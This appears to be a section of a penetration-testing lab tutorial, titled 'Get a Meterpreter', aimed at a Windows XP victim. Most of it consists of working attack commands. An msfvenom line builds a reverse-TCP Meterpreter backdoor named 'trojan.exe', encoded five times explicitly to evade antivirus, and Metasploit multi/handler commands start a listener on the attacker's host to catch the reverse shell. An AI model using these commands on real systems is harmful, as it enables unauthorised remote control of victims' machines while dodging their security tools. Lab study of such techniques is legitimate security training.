5.3 Get a Meterpreter


Getting a Meterpreter will allow you make some different things on the Victim Machine.
We're going to us two tools: “msfvenom” and “metasploit”

a) Generate a payload using MSFvenom.

On your Kali Machine run the following:

$cd ~/Downloads/winxpsp3
$msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.41 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > trojan.exe


This command will create a payload called “trojan.exe” and it'll encode it 5 times with “x86/shikata_ga_nai” to avoied most of antivirus were aware about it.

b) Start multihandler server on attacker machine.

Trojan will be executed on victim’s machine and it will send a back connection to attacker machine. So attacker must have a listener server on its machine.

$msfconsole


In Metasploit run the following commands:

msf5 >use exploit/multi/handler
msf5 exploit(multi/handler) >set payload windows/meterpreter/reverse_tcp
msf5> set LHOST 192.168.12.41
msf5> set LPORT 4444
msf5> exploit
